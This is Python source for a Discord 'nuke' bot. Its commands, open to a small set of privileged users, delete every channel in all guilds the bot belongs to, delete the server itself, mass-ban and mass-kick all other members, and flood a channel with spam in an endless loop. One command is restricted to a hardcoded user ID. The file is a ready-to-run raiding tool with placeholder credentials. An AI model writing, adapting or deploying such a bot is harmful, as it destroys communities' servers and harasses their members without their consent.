import discord

intents = discord.Intents.all()
client = discord.Client(intents=intents)

god_user = 'YOUR_USER_ID'
allowed_users = ['YOUR_USER_ID', 'YOUR_BOT_USER_ID'] # You can add more ID's



spam = True

@client.event
async def on_message(message):
  global spam
  if str(message.author.id) in allowed_users:
      if message.content == '!bot deletechn':
        await message.channel.send('Deleting Channels... ')
        for guild in client.guilds:
            for channel in guild.channels:
                await channel.delete()
      elif message.content == '!bot deletesrv':
        await message.channel.send('Deleting Server... ')
        await message.guild.delete()
      elif (message.content.startswith('!bot adduser')
       and str(message.author.id) == god_user):
        if len(message.content) > 12:
         splits_message = message.content.split(' ')
         user_id = " ".join(splits_message[2:])
         allowed_users.append(user_id)
         await message.channel.send(f'User <@{user_id}> has been added to the allowed users list.')
        else:
          await message.channel.send('Provide a user ID to add.') 
      elif (message.content.startswith('!bot removeuser')
         and str(message.author.id) == '798629431325360128'):
          if len(message.content) > 14:
           splited_message = message.content.split(' ')
           user_id = " ".join(splited_message[2:])
           if user_id in allowed_users:
             allowed_users.remove(user_id)
             user = client.get_user(int(user_id))
             await message.channel.send(f'User <@{user_id}> has been removed from the allowed users list.')
          else:
           await message.channel.send('Provide a user ID to remove.')  
      elif message.content.startswith('!bot spam'):
       spam = True
       split_message = message.content.split(' ')
       if len(message.content) > 9:
        spam_message = " ".join(split_message[2:])
        while spam is True:
          await message.channel.send(spam_message)
       else:
        await message.channel.send('Please provide a message to spam')
      elif message.content == '!bot':
        await message.channel.send("")
      elif message.content == '!bot help':
        await message.channel.send('figure out urself')
      elif message.content == '!bot ban all':
        for guild in client.guilds:
          for member in guild.members:
              if str(member.id) not in allowed_users:
                  await message.channel.send(f'Banning {member.name}')
                  await member.ban()
      elif message.content == '!bot kick all':
        for guild in client.guilds:
         for member in guild.members:
              if str(member.id) not in allowed_users:
                 await message.channel.send(f'Kicking {member.name}')
                 await member.kick()
      elif message.content == '!bot allowedusers':
        allowed_users_mentions = '\n'.join([f'<@{user}>' for user in allowed_users])
        embed = discord.message.Embed(title="Allowed Users", 
description=allowed_users_mentions, color=0x00ff00)
        await message.channel.send(embed=embed)
      elif message.content == '!bot config':
        embed = discord.message.Embed(title="Bot Commands", description="List of available commands and their descriptions", color=0x00ff00)
        command_desc = {
            '!bot deletechn': 'Deletes all channels in the server',
            '!bot deletesrv': 'Deletes the entire server',
            '!bot adduser [user_id]': 'Adds a user to the allowed users list',
            '!bot removeuser [user_id]': 'Removes a user from the allowed users list',
            '!bot spam [message]': 'Spams the provided message',
            '!bot ban all': 'Bans all members from the server except allowed users',
            '!bot kick all': 'Kicks all members from the server except allowed users',
            '!bot allowedusers': 'Lists all allowed users',
            '!bot config': 'Displays the list of available commands and their descriptions',
            '!bot stopspam': 'Stops the bot from spamming'
        }
        for command, description in command_desc.items():
            embed.add_field(name=command, value=description, inline=False)
        await message.channel.send(embed=embed)
      elif message.content == '!bot stopspam':
        spam = False
        await message.channel.send('Spam stopped')
client.run('YOUR_BOT_TOKEN')
